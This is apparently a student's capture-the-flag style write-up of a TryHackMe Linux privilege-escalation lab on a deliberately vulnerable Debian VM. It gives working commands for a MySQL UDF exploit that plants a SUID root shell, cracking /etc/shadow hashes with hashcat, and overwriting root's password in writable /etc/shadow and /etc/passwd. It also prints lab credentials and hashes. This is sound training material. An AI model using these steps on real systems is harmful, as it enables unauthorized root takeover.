Task 1: Deploy the Vulnerable Debian VM 
```
This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by Sagi Shahar as part of his local privilege escalation workshop but has been updated by Tib3rius as part of his Linux Privilege Escalation for OSCP and Beyond! course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.

Make sure you are connected to the TryHackMe VPN or using the in-browser Kali instance before trying to access the Debian VM!

SSH should be available on port 22. You can login to the "user" account using the following command:

ssh user@10.10.106.19

If you see the following message: "Are you sure you want to continue connecting (yes/no)?" type yes and press Enter.

The password for the "user" account is "password321".

The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell. Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!
```
## run id command
```console
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

# Task 2 Service Exploits
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service


To check if mysql is runing as roo run: ```ps -u root | grep mysql```. The guide for this task is clear so I will not copy past stuff here. just gona write what I need to remember from this task. It might be helpful for me in the future:
1. download the exploit from the link above
2. complie the exploit by
```console
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
3. now run as mysql as root ```mysql -u rooot```
4. Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our exploit:
```mysql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
5. Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission, then exit mysql
```mysql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
```
6. run the /tmp/rootbash executable with -p to gain a shell running with root privileges: 
```console
$ /tmp/rootbash -p
rootbash-4.1# whoami
root
rootbash-4.1# rm /tmp/rootbash
```

damnnnnn. The last command is removeing the the script. dont for get to romove it guys!!

# TASK 3: Weak File Permissions - Readable /etc/shadow 
```console
user@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```
on my kali
```console
kali@kali:~/LinuxPrivEsc$ echo "root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::" > root.txt
kali@kali:~/LinuxPrivEsc$ hashcat -a 0 -m 1800 -o cracked.txt root.txt /usr/share/wordlists/rockyou.txt --force
kali@kali:~/LinuxPrivEsc$ cat cracked.txt 
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:XXXXXXXXXXX
```
find out what XXXXXXXX is :P. GLHF

# Weak File Permissions - Writable /etc/shadow 
```console
user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```
damn we have write permission
```console
user@debian:~$ mkpasswd -m sha-512 kurohatwashere
$6$G5cFZMg03v81$/MHuRxqSlP8yFCqHOFIfQRXPwsor32wwUoPdE791lONV7YaviZQKi830I0TLuGj/kOj6OO9XI78Vx4CpYUGST0
user@debian:~$ nano /etc/shadow # replace root password (from 1st : to 2nd :) with the generated password
user@debian:~$ su root
Password: 
root@debian:/home/user# whoami 
root
```

# Weak File Permissions - Writable /etc/passwd
```console
user@debian:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~$ openssl passwd gu2washere
Warning: truncating password to 8 characters
p7WxO7eoMHzVY
user@debian:~$ nano /etc/passwd # replace hash between 1st colon and 2 colon (replacing the "x") with the genarated password
user@debian:~$ su root
Password: 
root@debian:/home/user# whoami
root
```

another way to do it is create a new root user in ```/etc/passwd``` by copy the root row and append it to the buttom of the file. Change the password (replace "x" or put the genarated password between 1st and 2nd colon) and change the user name. the run ```su newroot``` to get ROOT














